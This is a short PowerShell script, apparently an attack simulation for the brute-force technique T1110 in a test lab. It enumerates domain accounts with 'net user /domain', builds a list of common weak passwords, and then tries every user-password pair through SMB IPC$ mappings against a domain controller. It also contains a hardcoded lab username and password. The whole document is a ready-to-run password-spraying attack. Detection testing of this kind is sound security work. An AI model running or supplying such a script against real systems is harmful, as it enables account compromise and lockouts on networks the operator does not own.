
# GENERATE DATA
#net user /domain > .\data\input_file_users.txt
#echo "Password1" >> .\data\input_file_passwords.txt
#echo "1q2w3e4r" >>  .\data\input_file_passwords.txt
#echo "Password!" >> .\data\input_file_passwords.txt

## DEBUG CONNECTIVITY
#$remote_host = 'pexlab-dc'
#$user = 'internal_user_01'
#$password = 'patternexL1'
#New-SmbMapping  -RemotePath "\\$($remote_host)\ipc$"  -UserName $user  -Password $password  
#Remove-SmbMapping -RemotePath "\\$($remote_host)\ipc$"  -Force

# SIMULATION
foreach($users_line in [System.IO.File]::ReadLines('C:\adrian_ptrx\simulation\use_case\T1110\data\input_file_users.txt')) {
  foreach ($user in $users_line -split "\s+" -match '\S') {
    foreach($password in [System.IO.File]::ReadLines('C:\adrian_ptrx\simulation\use_case\T1110\data\input_file_passwords.txt')) {
        write-output "\\$($remote_host)\ipc$", $user, $password  
        New-SmbMapping  -RemotePath "\\$($remote_host)\ipc$"  -UserName $user  -Password $password  
        Remove-SmbMapping -RemotePath "\\$($remote_host)\ipc$"  -Force
    }
  }
}
